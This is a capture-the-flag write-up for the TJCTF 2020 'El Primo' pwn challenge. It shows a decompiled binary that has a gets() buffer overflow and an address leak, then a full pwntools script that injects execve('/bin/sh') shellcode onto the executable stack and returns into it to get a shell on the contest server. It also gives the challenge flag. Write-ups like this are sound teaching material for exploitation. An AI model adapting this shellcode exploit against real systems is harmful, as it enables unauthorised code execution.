# El Primo

> My friend just started playing Brawl Stars and he keeps raging because he
> can't beat El Primo! Can you help him?  
>  
> nc p1.tjctf.org 8011

## Description

Let's decompile the binary with Ghidra.

```c  
undefined4 main(void)  
{  
 char local_30 [32];  
 undefined *local_10;  
  
 local_10 = &stack0x00000004;  
 setbuf(stdout,(char *)0x0);  
 setbuf(stdin,(char *)0x0);  
 setbuf(stderr,(char *)0x0);  
 puts("What\'s my hard counter?");  
 printf("hint: %p\n",local_30);  
 gets(local_30);  
 return 0;  
}  
```

We get a possible buffer overflow with the `gets` function, and the `printf`
leaks the address of the buffer. We check the security of the binary, and
surprisingly, NX is disabled.

## Solution

As NX is disabled, we can include a shellcode in the buffer and jump there.
The only thing that I had to do in addition was to preserve the value of `ebp`
on the stack (otherwise I had a segfault when leaving the function), but then
its value is known once we know the address of the buffer.

```python  
from pwn import *

sh = remote('p1.tjctf.org', 8011)

shellcode = asm(shellcraft.i386.linux.execve('/bin/sh'))  
print(len(shellcode))

print(sh.recvuntil("hint: ").decode())  
addr = sh.recvline().decode()  
buf_addr = int(addr, 16)  
print(hex(buf_addr))  
print(addr)

ebp_value = buf_addr + 0x40

payload = shellcode + b"\x00"*(32-len(shellcode)) + p32(ebp_value) + b'a'*24 +
p32(buf_addr)

sh.sendline(payload)  
sh.interactive()  
```

Flag: `tjctf{3L_PR1M0O0OOO!1!!}`  

Original writeup (https://github.com/apoirrier/CTFs-
writeups/blob/master/TJCTF2020/Pwn/ElPrimo.md).